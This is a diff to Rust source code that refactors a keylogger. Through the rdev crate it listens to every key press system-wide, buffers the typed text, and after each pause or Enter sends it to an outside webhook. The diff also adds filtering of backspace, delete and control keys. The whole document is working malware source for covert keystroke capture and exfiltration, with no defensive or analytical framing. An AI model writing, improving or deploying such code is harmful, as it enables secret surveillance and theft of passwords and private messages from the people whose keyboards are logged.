@@ -8,52 +8,73 @@ use std::{
 
 use rdev::{Event, EventType, listen};
 
-use webhook::post_to_webhook;
-const ELAPSE_DURATION: Duration = Duration::from_secs(1);
+use webhook::WebhookSender;
+
+const INTERVAL: Duration = Duration::from_secs(2);
+
+const BACKSPACE: &str = "\x08";
+const CONTROL: &str = "\x1B";
+const DELETE: &str = "\u{7f}";
+
+const CARRIAGE_RETURN: &str = "\r";
+
+struct KeyState {
+    keys: String,
+
+    last_key_pressed: Option<SystemTime>,
+}
 
 pub struct KeyLogger {
-    current: Arc<Mutex<String>>,
+    sender: Arc<WebhookSender>,
 
-    last_press: Arc<Mutex<Option<SystemTime>>>,
+    state: Arc<Mutex<KeyState>>,
 }
 
 impl KeyLogger {
     pub fn new() -> Self {
         Self {
-            current: Arc::new(Mutex::new(String::new())),
+            sender: Arc::new(WebhookSender::new()),
 
-            last_press: Arc::new(Mutex::new(None::<SystemTime>)),
+            state: Arc::new(Mutex::new(KeyState {
+                keys: String::new(),
+                last_key_pressed: None::<SystemTime>,
+            })),
         }
     }
 
     pub fn start(self) {
         {
-            let last_press = Arc::clone(&self.last_press);
-            let current = Arc::clone(&self.current);
+            let state = Arc::clone(&self.state);
+            let sender = Arc::clone(&self.sender);
 
             thread::spawn(move || {
                 loop {
-                    thread::sleep(ELAPSE_DURATION);
+                    thread::sleep(INTERVAL);
 
-                    let last = *last_press.lock().unwrap();
-                    let mut text = current.lock().unwrap();
+                    let mut state = match state.lock() {
+                        Ok(state) => state,
+                        Err(_) => continue,
+                    };
 
-                    if text.is_empty() {
+                    let keys = &state.keys;
+                    let last_pressed = &state.last_key_pressed;
+
+                    if keys.is_empty() {
                         continue;
                     }
 
-                    if let Some(time) = last {
-                        if let Ok(elapsed) = time.elapsed() {
-                            if elapsed < ELAPSE_DURATION {
-                                continue;
-                            }
+                    if let Some(time) = last_pressed {
+                        if matches!(time.elapsed(), Ok(elapsed) if elapsed < INTERVAL) {
+                            continue;
+                        };
 
-                            post_to_webhook(text.to_string());
-                            text.clear();
+                        sender.post(&state.keys);
 
-                            *last_press.lock().unwrap() = None;
-                        }
-                    }
+                        state.keys.clear();
+                        state.last_key_pressed = None::<SystemTime>;
+                    } else {
+                        continue;
+                    };
                 }
             });
         }
@@ -61,8 +82,19 @@ impl KeyLogger {
         match listen(move |event: Event| match event.event_type {
             EventType::KeyPress(_) => {
                 if let Some(key) = event.name {
-                    *self.last_press.lock().unwrap() = Some(event.time);
-                    self.current.lock().unwrap().push_str(&key);
+                    if key == DELETE || key == BACKSPACE || key == CONTROL {
+                        return;
+                    }
+
+                    if key == CARRIAGE_RETURN {
+                        self.process_keys();
+                        return;
+                    }
+
+                    if let Ok(mut state) = self.state.lock() {
+                        state.last_key_pressed = Some(event.time);
+                        state.keys.push_str(&key);
+                    }
                 }
             }
             _ => (),
@@ -70,5 +102,17 @@ impl KeyLogger {
             Err(error) => eprintln!("{:?}", error),
             _ => (),
         }
+    }
+
+    fn process_keys(&self) {
+        let mut state = match self.state.lock() {
+            Ok(state) => state,
+            _ => return,
+        };
+
+        self.sender.post(&state.keys);
+
+        state.keys.clear();
+        state.last_key_pressed = None::<SystemTime>;
     }
 }
